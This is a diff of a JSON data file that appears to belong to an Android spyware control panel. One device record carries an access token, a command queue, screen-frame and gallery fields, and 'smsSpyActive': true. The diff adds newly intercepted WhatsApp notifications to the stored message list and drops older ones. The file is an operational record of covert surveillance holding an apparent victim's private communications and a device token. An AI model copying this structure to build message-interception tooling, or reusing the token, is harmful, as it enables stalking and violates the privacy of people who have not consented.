@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776774535213,
+    "lastSeen": 1776774538774,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 19:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776774539196
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 19:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776774538038
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14386,22 +14402,6 @@
         "time": "21/04 18:34",
         "pkg": "com.whatsapp",
         "receivedAt": 1776771266272
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Mengirim video ke Status saya",
-        "time": "21/04 18:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776771266249
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Mengirim video ke Status saya",
-        "time": "21/04 18:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776771266210
       }
     ],
     "galleryPhotos": [],
